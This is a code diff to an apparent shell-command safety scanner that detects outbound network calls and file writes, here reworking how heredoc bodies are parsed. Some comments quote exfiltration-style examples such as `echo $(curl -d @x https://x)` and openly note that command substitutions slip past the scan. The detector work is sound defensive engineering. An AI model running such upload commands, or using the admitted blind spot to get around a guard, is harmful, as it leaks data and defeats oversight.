@@ -1611,6 +1611,11 @@ const SEND_DATA_FLAGS: Record<string, true> = {
 export function commandHasOutboundNetwork(command: string): boolean {
 	// A document that mentions `wget` is not a fetch: inert heredoc bodies are
 	// data, and only a stdin-executing consumer keeps them under the scan.
+	// Bodies drop whether or not the delimiter is quoted. An unquoted one does
+	// run its `$(curl …)` at write time, but this scan reads segment LEADS, and
+	// `$(curl …)` is not a lead in any position — `echo $(curl -d @x https://x)`
+	// is invisible to it too. Keeping expanded bodies would buy nothing here and
+	// would put the documentation false positive back.
 	const normalized = withoutInertHeredocBodies(command.replace(/\\\r?\n/gu, ""));
 	for (const text of splitTopLevelCommands(normalized)) {
 		// `||` passes splitTopLevelCommands unsplit, so the fallback half of
@@ -1732,8 +1737,9 @@ export function checkWriteScopeConsistency(judgement: Judgement, command: string
 	const text = `${judgement.analysis ?? ""}\n${judgement.reason}`;
 	if (!WRITE_CONFINED_RE.test(text) && WRITE_DISCUSSED_RE.test(text)) return judgement;
 	// A heredoc body is stdin data: `cat > notes.md <<'EOF'` writes notes.md,
-	// not whatever absolute path the prose inside it names.
-	const scanned = withoutInertHeredocBodies(command.replace(/\\\r?\n/gu, ""));
+	// not whatever absolute path the prose inside it names. keepExpanded, so an
+	// unquoted delimiter keeps the writes its substitutions perform.
+	const scanned = withoutInertHeredocBodies(command.replace(/\\\r?\n/gu, ""), true);
 	for (const top of splitTopLevelCommands(scanned)) {
 		const bare = stripQuotedSpans(top);
 		for (const targetRe of WRITE_TARGET_RES) {
@@ -2549,38 +2555,97 @@ function heredocBody(text: string): string | null {
  */
 type HeredocRegion = { start: number; end: number; expanded: boolean; executed: boolean };
 
-/** Start of the command that owns an opener: everything back to the nearest
- *  shell operator. Quoting is not modeled — a misread widens the owner text,
- *  which can only make `executed` true, i.e. keep the body under scan. */
-function ownerExecutesStdin(text: string, openerIndex: number): boolean {
-	const prefix = text.slice(0, openerIndex);
-	let boundary = -1;
-	for (const ch of ["\n", ";", "|", "&", "(", ")", "{", "}"]) {
-		boundary = Math.max(boundary, prefix.lastIndexOf(ch));
-	}
-	return stdinExecutingInterpreters(prefix.slice(boundary + 1)).length > 0;
+const SHELL_OPERATOR_CHARS = new Set(["\n", ";", "|", "&", "(", ")", "{", "}"]);
+
+/**
+ * Does the command that owns a heredoc execute its stdin?
+ *
+ * `ownerText` is the command from the previous unquoted shell operator through
+ * the opener. Two passes, because either alone missed a live body:
+ * positional parsing (which understands `-`/`-s` and a script operand), then a
+ * bare scan for an interpreter NAME anywhere in the owner. The second catches
+ * wrappers the positional pass does not model (`time bash <<EOF`,
+ * `doas bash <<EOF`). Over-detecting only keeps a body under scan, so the
+ * loose second pass costs at worst an over-flag.
+ */
+function ownerExecutesStdin(ownerText: string): boolean {
+	if (stdinExecutingInterpreters(ownerText).length > 0) return true;
+	const words = tokenizeShellSegments(ownerText)[0] ?? [];
+	return words.some(word => interpreterName(word.toLowerCase()) !== "");
 }
 
+/** Anchored at a `<<`. The delimiter keeps its whole word: matching the `EOF`
+ *  prefix of `EOF-1` finds no closer and swallows the rest of the command. */
+const HEREDOC_OPENER_AT = /^<<(-?)[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_.\-]*)\2/u;
+
+/** Index where the body ends: the closing delimiter line, or the end of the
+ *  text for an unterminated heredoc, which is what the shell would read. The
+ *  closer is the WHOLE line — `  EOF` is body text for a plain `<<`, and only
+ *  `<<-` strips leading tabs. Ending late keeps more text under scan, which is
+ *  the safe direction. */
+function heredocBodyEnd(text: string, start: number, delimiter: string, stripsTabs: boolean): number {
+	// No `-`: escaping a hyphen outside a character class is an invalid escape
+	// under the `u` flag, and `EOF-1` is a legal delimiter.
+	const quoted = delimiter.replace(/[.*+?^${}()|[\]\\]/gu, "\\$&");
+	const closer = new RegExp(`^${stripsTabs ? "\\t*" : ""}${quoted}$`, "mu");
+	const found = closer.exec(text.slice(start));
+	return found ? start + found.index : text.length;
+}
+
+/**
+ * One left-to-right pass, quote-aware: a `<<` inside quotes opens nothing
+ * (`printf 'literal <<EOF'` is a string), and an operator inside quotes does
+ * not start a new command (`bash -s 'arg;value' <<EOF` is still bash). Bodies
+ * are skipped rather than scanned, so their contents cannot open a heredoc or
+ * leave the scanner inside a quote.
+ */
 function heredocRegions(text: string): HeredocRegion[] {
 	const regions: HeredocRegion[] = [];
-	// Local, not module-level: `lastIndex` is mutated below, and a shared
-	// stateful regex leaks that cursor into the next call.
-	const openers = /<<-?[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1/gu;
-	let opener: RegExpExecArray | null;
-	while ((opener = openers.exec(text)) !== null) {
-		const newline = text.indexOf("\n", opener.index + opener[0].length);
+	let quote: "'" | '"' | undefined;
+	let ownerStart = 0;
+	let i = 0;
+	while (i < text.length) {
+		const ch = text[i];
+		if (quote) {
+			if (ch === quote) quote = undefined;
+			i++;
+			continue;
+		}
+		if (ch === "'" || ch === '"') {
+			quote = ch;
+			i++;
+			continue;
+		}
+		if (ch === "\\") {
+			i += 2;
+			continue;
+		}
+		if (SHELL_OPERATOR_CHARS.has(ch)) {
+			ownerStart = i + 1;
+			i++;
+			continue;
+		}
+		if (ch !== "<" || text[i + 1] !== "<") {
+			i++;
+			continue;
+		}
+		const opener = HEREDOC_OPENER_AT.exec(text.slice(i));
+		if (!opener) {
+			i += 2;
+			continue;
+		}
+		const openerEnd = i + opener[0].length;
+		const newline = text.indexOf("\n", openerEnd);
 		if (newline === -1) break;
 		const start = newline + 1;
-		const closer = new RegExp(`^[ \t]*${opener[2]}[ \t]*$`, "mu").exec(text.slice(start));
-		const end = closer ? start + closer.index : text.length;
+		const end = heredocBodyEnd(text, start, opener[3], opener[1] === "-");
 		regions.push({
 			start,
 			end,
-			expanded: opener[1] === "",
-			executed: ownerExecutesStdin(text, opener.index),
+			expanded: opener[2] === "",
+			executed: ownerExecutesStdin(text.slice(ownerStart, openerEnd)),
 		});
-		// A `<<` inside the body is the body's own text, not a second opener.
-		openers.lastIndex = end;
+		i = end;
 	}
 	return regions;
 }
